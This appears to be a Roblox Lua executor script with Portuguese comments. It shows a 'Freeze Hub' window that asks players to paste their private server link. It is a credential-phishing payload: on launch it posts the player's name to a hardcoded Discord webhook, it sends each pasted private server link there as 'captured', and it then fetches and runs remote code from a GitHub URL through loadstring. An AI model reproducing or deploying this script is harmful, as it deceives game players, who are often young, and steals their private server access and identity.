local webhook = "https://discord.com/api/webhooks/1480675650044952736/dqyKyAbk3SGbQXgjdQVsY9Pk4j5EfMHzsJkkJsiGWsyCQYJgBSuvig8_VABzs8Qr7-Yl"

local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

-- envia nick quando o script abrir
pcall(function()

local data = {  
	["content"] = "@everyone 馃懁 Script executado por:\nNome: "..player.Name.."\nDisplay: "..player.DisplayName  
}  

local json = HttpService:JSONEncode(data)  

if request then  
	request({  
		Url = webhook,  
		Method = "POST",  
		Headers = {["Content-Type"]="application/json"},  
		Body = json  
	})  

elseif http_request then  
	http_request({  
		Url = webhook,  
		Method = "POST",  
		Headers = {["Content-Type"]="application/json"},  
		Body = json  
	})  

elseif syn and syn.request then  
	syn.request({  
		Url = webhook,  
		Method = "POST",  
		Headers = {["Content-Type"]="application/json"},  
		Body = json  
	})  
end

end)
-- GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui

local Frame = Instance.new("Frame")
Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0,350,0,200)
Frame.Position = UDim2.new(0.5,-175,0.5,-100)
Frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
Frame.Active = true
Frame.Draggable = true

local corner = Instance.new("UICorner",Frame)
corner.CornerRadius = UDim.new(0,12)

local Title = Instance.new("TextLabel")
Title.Parent = Frame
Title.Size = UDim2.new(1,0,0,30)
Title.Text = "Freeze Hub"
Title.TextColor3 = Color3.new(1,1,1)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20

local Info = Instance.new("TextLabel")
Info.Parent = Frame
Info.Size = UDim2.new(1,-20,0,60)
Info.Position = UDim2.new(0,10,0,35)
Info.TextWrapped = true
Info.Text = "Cole o link do seu servidor privado."
Info.TextColor3 = Color3.new(1,1,1)
Info.BackgroundTransparency = 1
Info.Font = Enum.Font.GothamBold
Info.TextSize = 14

local Box = Instance.new("TextBox")
Box.Parent = Frame
Box.Size = UDim2.new(1,-20,0,30)
Box.Position = UDim2.new(0,10,0,100)
Box.PlaceholderText = "Link do servidor privado..."
Box.Font = Enum.Font.GothamBold

local boxcorner = Instance.new("UICorner",Box)
boxcorner.CornerRadius = UDim.new(0,8)

local Confirm = Instance.new("TextButton")
Confirm.Parent = Frame
Confirm.Size = UDim2.new(1,-20,0,35)
Confirm.Position = UDim2.new(0,10,0,140)
Confirm.Text = "Confirmar"
Confirm.Font = Enum.Font.GothamBold
Confirm.TextSize = 16

local bcorner = Instance.new("UICorner",Confirm)
bcorner.CornerRadius = UDim.new(0,8)

-- ANIMA脟脙O DE LOADING
local function loading()

for i = 1,3 do  
	Confirm.Text = "Enviando."  
	task.wait(0.35)  

	Confirm.Text = "Enviando.."  
	task.wait(0.35)  

	Confirm.Text = "Enviando..."  
	task.wait(0.35)  
end

end

Confirm.MouseButton1Click:Connect(function()

local link = Box.Text  

-- verificar se 茅 link do roblox  
if not string.find(link,"roblox.com") then  

	Confirm.Text = "鉂� Link inv谩lido"  
	task.wait(2)  
	Confirm.Text = "Confirmar"  

	return  
end  

-- verificar se 茅 servidor privado  
if not string.find(link,"type=Server") and not string.find(link,"privateServerLinkCode") then  

	Confirm.Text = "鉂� N茫o 茅 servidor privado"  
	task.wait(2)  
	Confirm.Text = "Confirmar"  

	return  
end  

loading()  

local data = {  
	["content"] = "馃攽 Novo link privado capturado:\n"..link  
}  

local json = HttpService:JSONEncode(data)  

pcall(function()  

	if request then  
		request({  
			Url = webhook,  
			Method = "POST",  
			Headers = {["Content-Type"]="application/json"},  
			Body = json  
		})  

	elseif http_request then  
		http_request({  
			Url = webhook,  
			Method = "POST",  
			Headers = {["Content-Type"]="application/json"},  
			Body = json  
		})  

	elseif syn and syn.request then  
		syn.request({  
			Url = webhook,  
			Method = "POST",  
			Headers = {["Content-Type"]="application/json"},  
			Body = json  
		})  
	end  

end)  

-- anima莽茫o de fechar  
local tween = TweenService:Create(  
	Frame,  
	TweenInfo.new(0.4,Enum.EasingStyle.Quad),  
	{Size = UDim2.new(0,0,0,0)}  
)  

tween:Play()  
tween.Completed:Wait()  

ScreenGui:Destroy()  

-- abre seu Freeze Hub original  
loadstring(game:HttpGet("https://raw.githubusercontent.com/joaomiguelpn12-rgb/Official_freeze_trade/refs/heads/main/main.lua"))()

end)
